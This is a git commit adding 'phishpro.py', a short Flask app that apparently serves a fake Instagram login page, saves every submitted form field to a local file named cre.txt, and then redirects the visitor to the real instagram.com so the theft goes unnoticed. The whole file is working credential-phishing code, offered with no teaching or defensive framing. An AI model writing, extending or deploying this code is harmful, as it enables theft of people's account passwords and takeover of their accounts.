e111c53b2a32f11fa1f6eaf014e79a5015c8cee3
abhijithb200 <69154038+abhijithb200@users.noreply.github.com>
2020-08-03 20:09:26 +0530

    Add files via upload

---
+++ phishpro.py
@@ -0,0 +1,23 @@
+from flask import Flask,render_template,request,redirect,url_for
+import json
+
+app = Flask(__name__)
+
+@app.route('/')
+@app.route('/index')
+def index():
+    return render_template('instaform.html')
+
+@app.route('/process',methods=['GET','POST'])
+def process():
+    if request.method == 'POST':
+        data = request.form
+        with open('cre.txt','w') as f:
+            f.write(json.dumps(data)) 
+        return redirect("http://www.instagram.com")
+
+
+
+
+if __name__=="__main__":
+    app.run(debug=True)
